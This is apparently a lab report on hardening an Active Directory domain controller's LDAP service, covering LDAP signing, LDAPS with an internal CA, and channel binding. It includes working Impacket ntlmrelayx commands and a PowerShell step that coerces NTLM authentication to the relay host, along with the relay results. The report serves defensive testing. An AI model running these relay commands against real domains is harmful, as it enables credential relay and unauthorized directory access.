# Experiment 05 — LDAP Security: LDAP Signing, LDAPS and Channel Binding

## 1. Objective

The objective of this experiment is to assess the security of the LDAP service on an Active Directory domain controller, demonstrate the risks of NTLM relay attacks, and implement security measures to mitigate them.

The main objectives are:
- Identify security risks associated with LDAP authentication.
- Demonstrate NTLM relay attacks against LDAP and LDAPS.
- Configure LDAP Signing to enforce integrity protection for LDAP communications.
- Enable LDAPS using a certificate issued by an internal Certificate Authority.
- Enable LDAP Channel Binding to strengthen authentication over TLS connections.
- Verify the effectiveness of the security measures through comparative tests.

## 2. Lab Environment

| Machine | Role | IP Address |
|---|---|---|
| DC01 | Windows Server 2019 — Active Directory, DNS and AD CS | 192.168.100.10 |
| CLIENT01 | Windows 10 — Domain workstation | 192.168.100.20 |
| KALI01 | Kali Linux — Testing machine | 192.168.100.30 |

**Active Directory Domain:** `corp.local`

**Test Account:** `CORP\lab.ldaprelay`

## 3. Tools and Technologies

- Windows Server 2019
- Active Directory Domain Services (AD DS)
- Active Directory Certificate Services (AD CS)
- Kali Linux
- Impacket (`ntlmrelayx`)
- PowerShell
- OpenSSL
- LDAP (TCP port 389)
- LDAPS (TCP port 636)

## 4. Experiment Procedure

### 4.1 LDAP Service Verification

The LDAP and LDAPS services were checked on the domain controller.

- LDAP: TCP/389
- LDAPS: TCP/636

Initially, the domain controller did not have a suitable server certificate for LDAPS.

### 4.2 LDAPS Configuration

The Active Directory Certificate Services (AD CS) role was installed on DC01.

An Enterprise Root Certificate Authority was configured:

- CA Name: `CORP-ROOT-CA`
- Signature algorithm: SHA-256
- Key length: 2048 bits

A certificate based on the **Domain Controller Authentication** template was then issued to the domain controller.

The TLS connection on port 636 was tested using OpenSSL. The TLS handshake succeeded and the server certificate was presented.

### 4.3 Initial Test — NTLM Relay Against LDAP

An NTLM relay server was launched on Kali Linux using Impacket:

```bash
sudo impacket-ntlmrelayx \
  -t ldap://192.168.100.10 \
  --no-smb-server \
  --no-dump \
  --no-da \
  --no-acl \
  --no-validate-privs
```

On CLIENT01, a Windows authentication request was triggered using:

```powershell
Invoke-WebRequest `
    -Uri "http://192.168.100.30/" `
    -UseDefaultCredentials `
    -UseBasicParsing
```

**Result:** Impacket confirmed that authentication as `CORP\LAB.LDAPRELAY` against the LDAP service succeeded.

This demonstrates that NTLM authentication could be relayed to the LDAP service when the appropriate protections were not enforced.

No Active Directory objects were modified, and no privilege escalation was performed.

### 4.4 Remediation — LDAP Signing

LDAP signing was configured as required on DC01 using the following registry setting:

```powershell
$Key = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"

Set-ItemProperty `
    -Path $Key `
    -Name "LDAPServerIntegrity" `
    -Type DWord `
    -Value 2
```

Possible values:
- `0`: None.
- `1`: Negotiate signing.
- `2`: Require signing.

**Retest result:**

The NTLM relay attempt against LDAP on port 389 was rejected. Impacket returned the following message:

```text
Server rejected authentication because LDAP signing is enabled.
```

The configuration therefore blocked the tested relay scenario against standard LDAP.

### 4.5 Initial Test — NTLM Relay Against LDAPS

A second relay test was performed against LDAPS:

```bash
sudo impacket-ntlmrelayx \
  -t ldaps://DC01.corp.local \
  --no-smb-server \
  --no-dump \
  --no-da \
  --no-acl \
  --no-validate-privs
```

With the initial Channel Binding behavior, the result was:

```text
Authenticating against ldaps://DC01.corp.local
as CORP/LAB.LDAPRELAY SUCCEED
```

This demonstrates that the tested relay could still succeed over LDAPS despite LDAP signing being required.

### 4.6 Remediation — LDAP Channel Binding

LDAP Channel Binding was then configured on DC01:

```powershell
$Key = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"

New-ItemProperty `
    -Path $Key `
    -Name "LdapEnforceChannelBinding" `
    -PropertyType DWord `
    -Value 2 `
    -Force
```

Possible values:
- `0`: Never.
- `1`: When supported.
- `2`: Always.

After enabling the `Always` policy, the same NTLM relay test against LDAPS was repeated.

**Result:**

```text
Authenticating against ldaps://DC01.corp.local
as CORP/LAB.LDAPRELAY FAILED
```

The relay attempt was rejected.

### 4.7 Verification Through Windows Event Logs

To confirm the reason for the rejection, LDAP diagnostic logging was enabled:

```powershell
$DiagKey = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics"

Set-ItemProperty `
    -Path $DiagKey `
    -Name "16 LDAP Interface Events" `
    -Type DWord `
    -Value 2
```

Windows Event **3039** was subsequently found in the `Directory Service` event log.

Relevant event message:

```text
The following client performed an LDAP bind over SSL/TLS
and failed the channel binding token validation.

Client IP address:
192.168.100.30

Identity the client attempted to authenticate as:
NT AUTHORITY\ANONYMOUS LOGON
```

This event explicitly confirms that Channel Binding Token (CBT) validation failed for the LDAPS connection originating from Kali Linux.

## 5. Test Results

| Test | Configuration | Result |
|---|---|---|
| NTLM relay against LDAP | Signing set to Negotiate | Relayed authentication succeeded |
| NTLM relay against LDAP | Signing Required | Relay rejected |
| NTLM relay against LDAPS | Initial Channel Binding behavior | Relayed authentication succeeded |
| NTLM relay against LDAPS | Channel Binding Always | Relay rejected; Event 3039 confirmed |

## 6. Final Security Configuration

The following security settings are applied on DC01:

| Parameter | Value | Configuration |
|---|---:|---|
| `LDAPServerIntegrity` | 2 | LDAP Signing Required |
| `LdapEnforceChannelBinding` | 2 | LDAP Channel Binding Always |
| `16 LDAP Interface Events` | 2 | LDAP diagnostic logging enabled |

LDAPS is also operational with a certificate issued by the internal Certificate Authority `CORP-ROOT-CA`.

## 7. Conclusion

This experiment demonstrated the risks associated with NTLM relay attacks against LDAP and LDAPS services in an Active Directory environment.

The tests showed that requiring LDAP signing blocked the tested relay scenario against standard LDAP, but did not prevent the relay observed over LDAPS.

Enabling LDAP Channel Binding with the `Always` policy subsequently blocked the second relay scenario. Windows Event 3039 confirmed the failure of Channel Binding Token validation.

This experiment highlights the importance of combining LDAP Signing, LDAPS and LDAP Channel Binding to strengthen communication integrity and authentication security within an Active Directory infrastructure.
